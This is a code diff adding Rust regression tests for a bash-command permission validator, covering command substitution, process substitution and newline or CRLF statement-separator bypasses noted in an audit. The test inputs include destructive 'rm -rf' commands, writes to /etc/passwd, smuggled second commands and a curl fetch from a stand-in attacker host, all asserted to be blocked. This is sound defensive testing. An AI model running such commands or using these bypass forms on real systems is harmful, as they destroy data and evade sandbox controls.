@@ -837,3 +837,159 @@ mod path_coverage_tests {
         let _ = std::fs::remove_dir_all(&root);
     }
 }
+
+// ── Substitution and newline-separator regression coverage ───────────────────
+//
+// Regression tests for the two CRITICAL findings in docs/audits/2026-05-14.md:
+//
+// 1. Command substitution (`$(...)`, backticks, process substitution
+//    `<(...)` / `>(...)`) was tokenized as ordinary characters, leaving
+//    the inner command unvalidated and `$`-prefixed write targets silently
+//    skipped in `validate_paths`.
+// 2. Newline (`\n`) was treated as whitespace inside `shell_split`,
+//    causing multi-statement commands joined by `\n` to be validated only
+//    against the first statement while `sh -c` honored the rest at
+//    execution time.
+//
+// Parameter expansion (`${VAR}`) and bare variable reference (`$VAR`) are
+// intentionally NOT blocked — they expand to a value, not to a separately
+// executed command, and are common in legitimate workflows.
+#[cfg(test)]
+mod bash_substitution_and_separator_tests {
+    use crate::bash::{validate_bash_command, PermissionMode, ValidationResult};
+    use std::path::Path;
+
+    fn ro() -> PermissionMode {
+        PermissionMode::ReadOnly
+    }
+    fn ws() -> PermissionMode {
+        PermissionMode::WorkspaceWrite
+    }
+    fn workspace() -> &'static Path {
+        Path::new("/workspace")
+    }
+
+    // ── command substitution ────────────────────────────────────────────────
+
+    #[test]
+    fn blocks_dollar_paren_command_substitution_readonly() {
+        let r = validate_bash_command("echo $(rm -rf /etc/passwd)", ro(), workspace());
+        assert!(
+            matches!(r, ValidationResult::Block { .. }),
+            "$(...) must be blocked; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn blocks_dollar_paren_redirection_target_workspace_write() {
+        // Audit 2026-05-14: `echo data > $(echo /etc/passwd)` tokenized so
+        // the redirection target started with `$`, which `validate_paths`
+        // silently skipped, allowing the substituted host path to be
+        // written at execution time.
+        let r = validate_bash_command("echo data > $(echo /etc/passwd)", ws(), workspace());
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn blocks_glued_dollar_paren_redirection_workspace_write() {
+        // Quoted, glued form: `>"$(...)"` collapses into a single token
+        // because shell_split does not split on `>`. The substitution
+        // check still catches the `$(` substring inside the token.
+        let r = validate_bash_command(
+            "echo data >\"$(echo /etc/passwd)\"",
+            ws(),
+            workspace(),
+        );
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn blocks_backtick_command_substitution_readonly() {
+        let r = validate_bash_command("echo `rm -rf /workspace/data`", ro(), workspace());
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn blocks_process_substitution_read_form_workspace_write() {
+        let r = validate_bash_command(
+            "cat <(curl http://evil.example/x)",
+            ws(),
+            workspace(),
+        );
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn blocks_process_substitution_write_form_workspace_write() {
+        let r = validate_bash_command("tee >(rm -rf /workspace/x)", ws(), workspace());
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn allows_brace_parameter_expansion_workspace_write() {
+        let r = validate_bash_command("echo ${HOME}", ws(), workspace());
+        assert_eq!(r, ValidationResult::Allow);
+    }
+
+    #[test]
+    fn allows_bare_dollar_variable_workspace_write() {
+        let r = validate_bash_command("echo $PATH", ws(), workspace());
+        assert_eq!(r, ValidationResult::Allow);
+    }
+
+    // ── newline as command separator ────────────────────────────────────────
+
+    #[test]
+    fn blocks_newline_separated_write_in_readonly() {
+        // Audit 2026-05-14: `echo ok\nrm -rf /workspace/important` was
+        // tokenized as a single segment whose first word was `echo`, so
+        // the trailing destructive command slipped through.
+        let r = validate_bash_command(
+            "echo ok\nrm -rf /workspace/important",
+            ro(),
+            workspace(),
+        );
+        assert!(
+            matches!(r, ValidationResult::Block { .. }),
+            "newline-separated rm must reach check_command_segment; got {r:?}"
+        );
+    }
+
+    #[test]
+    fn blocks_newline_separated_write_redirection_outside_workspace() {
+        let r = validate_bash_command(
+            "echo first\necho second > /etc/passwd",
+            ws(),
+            workspace(),
+        );
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+
+    #[test]
+    fn allows_newline_separated_safe_segments_in_readonly() {
+        let r = validate_bash_command("cat file.txt\nls -la", ro(), workspace());
+        assert_eq!(r, ValidationResult::Allow);
+    }
+
+    #[test]
+    fn newline_inside_single_quotes_is_not_a_separator() {
+        // Newline inside single quotes is literal data, not a statement
+        // boundary; shell_split must keep the whole quoted segment as one
+        // token so the validator does not see a spurious second statement.
+        let r = validate_bash_command("echo 'line1\nline2'", ws(), workspace());
+        assert_eq!(r, ValidationResult::Allow);
+    }
+
+    #[test]
+    fn carriage_return_segments_like_newline() {
+        // CRLF line endings must also be honored as separators so that
+        // payloads composed on Windows hosts cannot bypass the check by
+        // emitting `\r\n` instead of `\n`.
+        let r = validate_bash_command(
+            "echo ok\r\nrm -rf /workspace/x",
+            ro(),
+            workspace(),
+        );
+        assert!(matches!(r, ValidationResult::Block { .. }));
+    }
+}
